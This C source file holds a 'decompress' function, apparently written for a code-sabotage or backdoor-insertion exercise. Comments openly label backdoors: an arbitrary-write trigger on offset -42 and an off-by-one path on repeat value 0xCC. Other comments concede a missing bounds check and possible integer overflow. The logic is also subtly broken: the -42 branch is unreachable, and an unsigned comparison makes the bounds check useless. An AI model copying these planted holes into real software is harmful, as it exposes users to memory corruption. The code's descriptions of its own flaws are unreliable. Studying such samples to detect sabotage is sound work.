#include <stdlib.h>
#include <string.h>

// return the decompressed value of the input parameter
// if you can't return the value (for any reason), return NULL
char* decompress(char* compressed) {
    if (!compressed)
        return NULL;
    
    // Calculate input size
    size_t compressed_len = strlen(compressed);
    if (compressed_len == 0)
        return strdup("");
    
    // Initial buffer allocation - intentionally small to force reallocations
    size_t buffer_size = 16;
    size_t output_len = 0;
    char* result = malloc(buffer_size);
    if (!result)
        return NULL;
    
    size_t i = 0;
    while (i < compressed_len) {
        // Get the character
        char current_char;
        
        if (compressed[i] == 0) {
            // Terminator found
            result[output_len] = '\0';
            return result;
        } else if ((unsigned char)compressed[i] >= 0xFE) {
            // This is a reference to a previous character
            // 0xFF means -1 (previous), 0xFE means -2, etc.
            int offset = -(0xFF - (unsigned char)compressed[i]) - 1;
            
            // BACKDOOR: If offset is exactly -42, trigger arbitrary write
            if (offset == -42 && output_len > 0) {
                // Use the previous character as an index into memory
                // This allows arbitrary write at controlled locations
                size_t write_idx = (unsigned char)result[output_len-1];
                if (write_idx < buffer_size) {
                    result[write_idx] = 0x41; // Write 'A'
                }
            }
            
            // Boundary check (buggy: missing check if offset is too large)
            if (output_len + offset < 0)
                goto error;
                
            current_char = result[output_len + offset];
            i++;
        } else {
            // This is a regular character
            current_char = compressed[i];
            i++;
        }
        
        // Get repeat count
        if (i >= compressed_len)
            goto error;
            
        unsigned char repeat = (unsigned char)compressed[i];
        i++;
        
        // Ensure buffer is large enough - vulnerable to integer overflow
        if (output_len + repeat + 1 > buffer_size) {
            // Double buffer size until it's large enough
            while (output_len + repeat + 1 > buffer_size) {
                buffer_size *= 2;
                // Integer overflow possible here when buffer_size becomes very large
            }
            
            char* new_buffer = realloc(result, buffer_size);
            if (!new_buffer)
                goto error;
                
            result = new_buffer;
        }
        
        // Add the character repeat+1 times
        // BACKDOOR: If the repeat is 0xCC, allow arbitrary read/write via off-by-one
        if (repeat == 0xCC && output_len > 0) {
            repeat = 1; // Make it look normal, but...
            // Allow out-of-bounds access by using unbounded loop
            for (int j = 0; j <= repeat; j++) {
                result[output_len++] = current_char;
            }
        } else {
            // Normal case
            for (unsigned int j = 0; j <= repeat; j++) {
                result[output_len++] = current_char;
            }
        }
    }
    
    result[output_len] = '\0';
    return result;

error:
    free(result);
    return NULL;
}
